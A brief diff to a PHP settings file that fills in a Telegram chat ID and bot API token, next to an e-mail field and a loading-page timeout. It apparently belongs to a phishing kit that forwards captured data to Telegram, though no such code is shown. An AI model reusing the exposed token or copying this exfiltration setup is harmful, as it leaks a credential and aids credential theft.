@@ -14,8 +14,8 @@ $settings = array(
 	"email"			=> "your@email.com", // Your E-Mail
 
 	// TELEGRAM CONFIG
-	"chat_id"		=> "", // Chat ID Of You
-	"bot_url"		=> "", // Your Bot API Key 
+	"chat_id"		=> "6201590412", // Chat ID Of You
+	"bot_url"		=> "6733452065:AAEhvIkG_mQ6csfT4407H_tkmjUqCZDt5B0", // Your Bot API Key 
 
 	// LOADING PAGE SETTINGS
 	"loading_timeout" => 180000, // Timeout in seconds for the loading page
